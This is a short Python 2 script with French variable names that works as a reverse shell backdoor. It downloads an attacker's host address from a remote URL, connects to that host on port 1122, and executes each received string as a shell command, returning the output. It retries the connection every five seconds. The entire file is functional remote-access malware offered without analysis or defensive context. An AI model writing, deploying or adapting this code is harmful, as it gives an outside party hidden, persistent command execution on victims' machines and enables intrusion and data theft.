import socket, subprocess, sys, os, time, urllib
import xml.dom.minidom


URL="https://frompixel.com/recept/test.txt"
resultat = urllib.urlopen(URL).read()
print resultat
host = resultat
# host = "localhost"
port = 1122
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def recevCommand():
    while True:
        commande =  sock.recv(4096)
        if 'quitter' in commande:
            # print 'Fermeture de la connexion'
            sock.close()
            break
        else:
            shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                sock.send(shell.stdout.read() + shell.stderr.read())
            finally:
                sock.send("ok")
def Connect():
    try:
        sock.connect((host, port))
        recevCommand()
    except Exception as e:
        print("something's wrong with %s:%d. Exception is %s" % (host, port, e))
    finally:
        print 'pas de co'
        # sock.close()

def Main ():
    while True:
        Connect()
        time.sleep(5)
Main()
